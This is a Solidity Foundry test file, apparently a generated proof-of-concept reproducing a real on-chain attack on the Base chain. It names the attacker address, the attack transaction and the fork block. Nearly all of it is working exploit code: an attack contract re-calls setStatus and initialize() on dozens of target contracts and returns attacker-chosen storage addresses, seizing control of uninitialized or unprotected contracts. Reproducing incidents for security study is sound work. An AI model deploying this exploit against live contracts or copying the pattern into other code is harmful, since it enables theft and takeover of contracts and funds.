// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import {Test, console2} from "forge-std/Test.sol";
import "./Base.sol";

// @KeyInfo - Total Lost : N/A
// Attacker : 0xbb31f31480cf4bcf70d0e1ff0df7f09218f8d2a3
// Attack Contract : 0x99aa571fd5e681c2d27ee08a7b7989db02541d13
// Vulnerable Contract : 0x99aa571fd5e681c2d27ee08a7b7989db02541d13
// Attack Tx : 0x18ccaa7baba166fa45bbd75cc01d58f60f6b6ac2ad1425a6d93295ccff096533
// Block : 47682240
// Chain : Base
// Analysis :
//
// @Reproduction
// Verdict : pass
// Economic Proof : unpriced_reproduction
// Reproduced Value : N/A
//
// @POC Author
// Generated PoC

contract AttackTest is Base {
    address constant ATTACKER_EOA = Addresses.attacker_eoa;
    address constant ATTACK_CONTRACT = Addresses.attack_contract;
    uint256 constant FORK_BLOCK = 47682239;
    uint256 constant TX_TIMESTAMP = 1782153827;
    uint256 constant TX_BLOCK_NUMBER = 47682240;
    uint256 constant TX_VALUE = 0;

    function setUp() public {
        vm.createSelectFork(vm.envString("POC_FORK_ENDPOINT"), FORK_BLOCK);
        if (TX_TIMESTAMP != 0) vm.warp(TX_TIMESTAMP);
        if (TX_BLOCK_NUMBER != 0) vm.roll(TX_BLOCK_NUMBER);
    }

    function testPoC() public {
        vm.startPrank(ATTACKER_EOA, ATTACKER_EOA);
        OurAttack attack = _deployAttack();
        _prepareProfit(attack);
        attack.attack{value: TX_VALUE}();
        vm.stopPrank();
        _assertProfit();
    }

    function _deployAttack() internal returns (OurAttack attack) {
        if (ATTACK_CONTRACT != address(0)) {
            _etchAttackRuntime();
            attack = OurAttack(payable(ATTACK_CONTRACT));
        } else {
            attack = new OurAttack();
        }
    }

    function _prepareProfit(OurAttack attack) internal {
        _prepareProfit(address(attack), address(0));
    }

    function _etchAttackRuntime() internal {
        // Preserve the observed attack address while replacing its runtime with this readable surface.
        vm.etch(ATTACK_CONTRACT, type(OurAttack).runtimeCode);
    }

    function _expectProfitLegs(address attack, address attackChild) internal pure override {
        attack;
        attackChild;
        return;
    }
}

contract OurAttack {
    function attack() external payable {
        _toggleEarlyAssets();
        _toggleMidAssets();
        _toggleLateAssets();
        _initializeAssets();
    }

    function _toggleEarlyAssets() internal {
        IContract_4CD646_4068(Addresses.A_4CD646_4068).getOwners();
        _trySetStatus(Addresses.A_8DA0F2_38F9, false);
        _trySetStatus(Addresses.A_8DA0F2_38F9, true);
        _trySetStatus(Addresses.A_27CAD1_A10A, false);
        _trySetStatus(Addresses.A_27CAD1_A10A, true);
        _trySetStatus(Addresses.A_9C0862_9798, false);
        _trySetStatus(Addresses.A_9C0862_9798, true);
        _trySetStatus(Addresses.A_98B045_75EF, false);
    }

    function _toggleMidAssets() internal {
        _trySetStatus(Addresses.A_98B045_75EF, true);
        _trySetStatus(Addresses.A_F98CAF_0094, false);
        _trySetStatus(Addresses.A_F98CAF_0094, true);
        _trySetStatus(Addresses.A_DE3195_2005, false);
        _trySetStatus(Addresses.A_DE3195_2005, true);
        IContract_80F6D2_74AE(Addresses.A_80F6D2_74AE).setStatus(false);
        IContract_80F6D2_74AE(Addresses.A_80F6D2_74AE).setStatus(true);
        IContract_FFC349_EB44(Addresses.A_FFC349_EB44).setStatus(false);
        IContract_FFC349_EB44(Addresses.A_FFC349_EB44).setStatus(true);
        _trySetStatus(Addresses.A_DC4C66_7B1D, true);
        IContract_A4F4F1_D288(Addresses.A_A4F4F1_D288).setStatus(false);
        IContract_A4F4F1_D288(Addresses.A_A4F4F1_D288).setStatus(true);
        IContract_7DBC7E_F579(Addresses.A_7DBC7E_F579).setStatus(false);
        IContract_7DBC7E_F579(Addresses.A_7DBC7E_F579).setStatus(true);
        IContract_EA53A2_8C1C(Addresses.A_EA53A2_8C1C).setStatus(false);
        IContract_EA53A2_8C1C(Addresses.A_EA53A2_8C1C).setStatus(true);
    }

    function _toggleLateAssets() internal {
        IContract_B9C1D3_041D(Addresses.A_B9C1D3_041D).setStatus(false);
        IContract_B9C1D3_041D(Addresses.A_B9C1D3_041D).setStatus(true);
        IContract_370943_C076(Addresses.A_370943_C076).setStatus(false);
        IContract_370943_C076(Addresses.A_370943_C076).setStatus(true);
        _trySetStatus(Addresses.A_D3AA1B_E4FC, true);
        _trySetStatus(Addresses.A_9A8CB4_CD4A, true);
        IContract_8C9A55_6669(Addresses.A_8C9A55_6669).setStatus(false);
        IContract_8C9A55_6669(Addresses.A_8C9A55_6669).setStatus(true);
        IContract_E2757B_3E7C(Addresses.A_E2757B_3E7C).setStatus(true);
        _trySetStatus(Addresses.A_7CA298_5B77, true);
        IContract_D52B76_8752(Addresses.A_D52B76_8752).setStatus(true);
        _trySetStatus(Addresses.DKGPC, true);
        IContract_38B549_21B5(Addresses.A_38B549_21B5).setStatus(true);
        IContract_AA86B0_6F04(Addresses.A_AA86B0_6F04).setStatus(true);
        IDKGSC(Addresses.DKGSC).setStatus(true);
        IContract_57307C_739D(Addresses.A_57307C_739D).initialize();
        IContract_F98CAF_0094(Addresses.A_F98CAF_0094).initialize();
        IContract_DE3195_2005(Addresses.A_DE3195_2005).initialize();
        IDKA(Addresses.DKA).initialize();
        IContract_80F6D2_74AE(Addresses.A_80F6D2_74AE).initialize();
        IContract_FFC349_EB44(Addresses.A_FFC349_EB44).initialize();
        IContract_DC4C66_7B1D(Addresses.A_DC4C66_7B1D).initialize();
        IContract_A4F4F1_D288(Addresses.A_A4F4F1_D288).initialize();
    }

    function _initializeAssets() internal {
        IContract_7DBC7E_F579(Addresses.A_7DBC7E_F579).initialize();
        IContract_EA53A2_8C1C(Addresses.A_EA53A2_8C1C).initialize();
        IContract_B9C1D3_041D(Addresses.A_B9C1D3_041D).initialize();
        IContract_370943_C076(Addresses.A_370943_C076).initialize();
        IDKGCG(Addresses.DKGCG).initialize();
        IContract_D3AA1B_E4FC(Addresses.A_D3AA1B_E4FC).initialize();
        IContract_9A8CB4_CD4A(Addresses.A_9A8CB4_CD4A).initialize();
        IContract_8C9A55_6669(Addresses.A_8C9A55_6669).initialize();
        IContract_E2757B_3E7C(Addresses.A_E2757B_3E7C).initialize();
        IContract_7CA298_5B77(Addresses.A_7CA298_5B77).initialize();
        IContract_D52B76_8752(Addresses.A_D52B76_8752).initialize();
        IDKGPC(Addresses.DKGPC).initialize();
        IContract_38B549_21B5(Addresses.A_38B549_21B5).initialize();
        IContract_AA86B0_6F04(Addresses.A_AA86B0_6F04).initialize();
        IDKGSC(Addresses.DKGSC).initialize();
    }

    receive() external payable {}

    function getContractAddress(string calldata storageName) external payable {
        storageName;
        bytes memory ret = hex"000000000000000000000000a81a52b4dda010896cdd386c7fbdc5cdc835ba23";
        assembly { return(add(ret, 32), mload(ret)) }
    }

    function getAssetStorageAddress(string calldata storageName) external payable {
        storageName;
        if (
            msg.sender == 0x38b54901f0ADE112Fd9002024dbdd0DB3D7321B5
                || msg.sender == 0x8C9A555402A8F14c20810ea1b8C6B27479F96669
        ) {
            bytes memory dkaAddress = hex"00000000000000000000000080738050893c3e769560331c8fd63a421b340d46";
            assembly { return(add(dkaAddress, 32), mload(dkaAddress)) }
        }
        if (
            msg.sender == 0x38b54901f0ADE112Fd9002024dbdd0DB3D7321B5
                || msg.sender == 0x8C9A555402A8F14c20810ea1b8C6B27479F96669
                || msg.sender == 0xe2757b866765D52D48e0Ae0aE79AA3332F163E7c
        ) {
            bytes memory dkgcgAddress = hex"0000000000000000000000001b37447cc735ab8ac29f057c8874087fe9a98154";
            assembly { return(add(dkgcgAddress, 32), mload(dkgcgAddress)) }
        }
        bytes memory ret = hex"00000000000000000000000080738050893c3e769560331c8fd63a421b340d46";
        assembly { return(add(ret, 32), mload(ret)) }
    }

    fallback() external payable {
        if (msg.data.length == 0) return;
        if (msg.sig == 0x46e46a09) {
            _toggleEarlyAssets();
            _toggleMidAssets();
            _toggleLateAssets();
            _initializeAssets();
            return;
        }
    }

    mapping(uint256 => uint256) private _entryCallbackCursor;
    mapping(address => uint256) private _balancerVaultPreBalance;

    function _nextEntryCb(uint256 index) internal returns (uint256 ordinal) {
        ordinal = _entryCallbackCursor[index];
        _entryCallbackCursor[index] = ordinal + 1;
    }

    function _recordBalancerPre(address[] memory tokens) internal {
        for (uint256 i = 0; i < tokens.length; i++) {
            _balancerVaultPreBalance[tokens[i]] =
                IERC20Like(tokens[i]).balanceOf(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
        }
    }

    function recordBalancerPre(address[] memory tokens) external {
        _recordBalancerPre(tokens);
    }

    function balancerVaultPreBalance(address token) external view returns (uint256) {
        return _balancerVaultPreBalance[token];
    }

    function _trySetStatus(address target, bool enabled) internal {
        (bool ok,) = target.call(abi.encodeWithSelector(IStatusToggle.setStatus.selector, enabled));
        ok;
    }
}

library Addresses {
    address internal constant ZERO = address(0);
    address internal constant A_17F5AD_2A38 = 0x17F5ad6192E24F5c7CD888742532124780a42a38;
    address internal constant DKGCG = 0x1B37447CC735Ab8Ac29f057c8874087Fe9A98154;
    address internal constant A_1FA06D_623D = 0x1fa06DC62de288A1DB21B39afc93e44EE2a8623d;
    address internal constant DKGSC = 0x267A64898164be4aaBbB3A2A13de170411f6E9b8;
    address internal constant A_271DD6_58A1 = 0x271Dd66348844bbe1d8bf838a4DAE5b4B7f558A1;
    address internal constant A_27CAD1_A10A = 0x27CAd12da8C3CE8b9ca58BdcaB5A815Bea17a10A;
    address internal constant A_30BE8E_CD75 = 0x30BE8EDF5Ee202660Af0814A3F3FC341A11ecD75;
    address internal constant A_370943_C076 = 0x370943487c766633Da68DB4048E57674a7a6c076;
    address internal constant A_38B549_21B5 = 0x38b54901f0ADE112Fd9002024dbdd0DB3D7321B5;
    address internal constant A_390B6D_C9F7 = 0x390B6Dc895D5C815FDC85023d6FB1261fe62c9F7;
    address internal constant A_4CD646_4068 = 0x4Cd6467b797846E63a27c92350d040C428394068;
    address internal constant A_507562_6F6E = 0x5075626C697368696E67436F6e76696374696f6e;
    address internal constant A_536861_6765 = 0x5368617264696e675461626c6553746F72616765;
    address internal constant A_57307C_739D = 0x57307C87E95a372C5D94BCC372bb7304505A739D;
    address internal constant A_57FE6A_2EB2 = 0x57fE6A6f56191bEcfAC857778FdB002803cd2EB2;
    address internal constant A_599C59_3EE1 = 0x599C59081d9B673BBDdAfbc933B669aA84eA3eE1;
    address internal constant A_5A8263_19FE = 0x5a8263F9f65dB112e16243698DEF36ab744e19fe;
    address internal constant A_5D7ACE_CEB2 = 0x5d7aCedD766b39aa6f20BC49D8F36D2665cdcEb2;
    address internal constant A_62AC64_0ED3 = 0x62Ac6414857FAaa08eadA066F3370e7fB3010ed3;
    address internal constant A_7CA298_5B77 = 0x7CA29896DA9005a40B0D8A8EbaDCB6A0B4155b77;
    address internal constant A_7DBC7E_F579 = 0x7Dbc7E07e1e2C935763D92904a39B009c86ff579;
    address internal constant DKA = 0x80738050893C3E769560331C8FD63A421b340D46;
    address internal constant A_80F6D2_74AE = 0x80F6D2673689c3B7495942101137F741405A74Ae;
    address internal constant A_825B05_9B70 = 0x825B05c8838A8D939EADd08D80e4bce980059b70;
    address internal constant A_8AA667_233C = 0x8aA667303c37CD1EF4e7C102140879e10A4F233c;
    address internal constant A_8C9A55_6669 = 0x8C9A555402A8F14c20810ea1b8C6B27479F96669;
    address internal constant A_8DA0F2_38F9 = 0x8DA0F2BB005094758CD6afBC0c8aa6D31b0238f9;
    address internal constant A_98B045_75EF = 0x98B045daeFFDA88741EEa76C18abAecaF14175eF;
    address internal constant attack_contract = 0x99Aa571fD5e681c2D27ee08A7b7989DB02541d13;
    address internal constant A_9A8CB4_CD4A = 0x9a8cb45399eD8f4aE6B8FEEa9586d18f86e7cD4a;
    address internal constant A_9C0862_9798 = 0x9C086257742bEF941F28de668fA5dF62c9dE9798;
    address internal constant A_A32780_C2D9 = 0xA32780d6A89542462271ca6d2d78373889F1C2d9;
    address internal constant A_A4F4F1_D288 = 0xa4F4f1e61f2BE32E92Fd1D07558a3DB5b519D288;
    address internal constant A_A81A52_BA23 = 0xA81a52B4dda010896cDd386C7fBdc5CDc835ba23;
    address internal constant A_A9F363_4919 = 0xa9F363FE928752dc3d8Aa3F52c1E00416d464919;
    address internal constant A_AA86B0_6F04 = 0xAa86B03B6579D9B618DD4afc1097e71AFb7d6f04;
    address internal constant A_ADF138_0413 = 0xADf1382CAE65Cb81EF5bd889c49d4576Ea610413;
    address internal constant A_B9C1D3_041D = 0xb9C1D3D326c303bD2fb40713c26B5EA1C58e041d;
    address internal constant BalancerVault = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;
    address internal constant attacker_eoa = 0xbB31f31480Cf4BcF70d0E1ff0dF7f09218F8D2A3;
    address internal constant A_C28F31_11D7 = 0xc28F310A87f7621A087A603E2ce41C22523F11d7;
    address internal constant A_D3AA1B_E4FC = 0xD3Aa1b94c19408fD44b1A457f533509A4D1CE4FC;
    address internal constant A_D52B76_8752 = 0xd52B7656A764587c9E524C52E7CF20153c918752;
    address internal constant A_DBDFE1_8802 = 0xDBdfe1628B4700f2D45Cb2292F905e56F06B8802;
    address internal constant A_DC4C66_7B1D = 0xdc4c66f906A054e0dDdfEE1cEF7bd3b26a677b1D;
    address internal constant A_DC67F8_094B = 0xDc67F8Fc0021b20db24701dfA6E67E5739bf094b;
    address internal constant A_DE3195_2005 = 0xdE319588734DCcbdeCa70ff782f12c5822Db2005;
    address internal constant DKGPC = 0xE07F3EEd0B5C56dff27588BDCbb5c0efcA1aCe24;
    address internal constant A_E2757B_3E7C = 0xe2757b866765D52D48e0Ae0aE79AA3332F163E7c;
    address internal constant A_EA53A2_8C1C = 0xea53A20b2f066c184439090da2e5b286B40d8c1c;
    address internal constant A_F59CA9_E7AF = 0xF59ca9Eb70D7af0700394924B1053548dE6aE7aF;
    address internal constant A_F98CAF_0094 = 0xf98CAF485Ce5f9398C52d7f1435085cBd20a0094;
    address internal constant A_FFC349_EB44 = 0xffc349C8deb8d88Dc8a99d379413359Ca92DEB44;
    address internal constant A_FFFFFF_FFFF = 0xFFfFfFffFFfffFFfFFfFFFFFffFFFffffFfFFFfF;
}

interface IContract_27CAD1_A10A {
    function setStatus(bool) external;
}

interface IStatusToggle {
    function setStatus(bool) external;
}

interface IContract_370943_C076 {
    function initialize() external;
    function setStatus(bool) external;
}

interface IContract_38B549_21B5 {
    function initialize() external;
    function setStatus(bool) external;
}

interface IContract_4CD646_4068 {
    function getOwners() external view;
}

interface IContract_57307C_739D {
    function initialize() external;
}

interface IContract_7CA298_5B77 {
    function initialize() external;
    function setStatus(bool) external;
}

interface IContract_7DBC7E_F579 {
    function initialize() external;
    function setStatus(bool) external;
}

interface IContract_80F6D2_74AE {
    function initialize() external;
    function setStatus(bool) external;
}

interface IContract_8C9A55_6669 {
    function initialize() external;
    function setStatus(bool) external;
}

interface IContract_8DA0F2_38F9 {
    function setStatus(bool) external;
}

interface IContract_98B045_75EF {
    function setStatus(bool) external;
}

interface IContract_9A8CB4_CD4A {
    function initialize() external;
    function setStatus(bool) external;
}

interface IContract_9C0862_9798 {
    function setStatus(bool) external;
}

interface IContract_A4F4F1_D288 {
    function initialize() external;
    function setStatus(bool) external;
}

interface IContract_AA86B0_6F04 {
    function initialize() external;
    function setStatus(bool) external;
}

interface IContract_B9C1D3_041D {
    function initialize() external;
    function setStatus(bool) external;
}

interface IContract_D3AA1B_E4FC {
    function initialize() external;
    function setStatus(bool) external;
}

interface IContract_D52B76_8752 {
    function initialize() external;
    function setStatus(bool) external;
}

interface IContract_DC4C66_7B1D {
    function initialize() external;
    function setStatus(bool) external;
}

interface IContract_DE3195_2005 {
    function initialize() external;
    function setStatus(bool) external;
}

interface IContract_E2757B_3E7C {
    function initialize() external;
    function setStatus(bool) external;
}

interface IContract_EA53A2_8C1C {
    function initialize() external;
    function setStatus(bool) external;
}

interface IContract_F98CAF_0094 {
    function initialize() external;
    function setStatus(bool) external;
}

interface IContract_FFC349_EB44 {
    function initialize() external;
    function setStatus(bool) external;
}

interface IDKA {
    function initialize() external;
}

interface IDKGCG {
    function initialize() external;
}

interface IDKGPC {
    function initialize() external;
    function setStatus(bool) external;
}

interface IDKGSC {
    function initialize() external;
    function setStatus(bool) external;
}
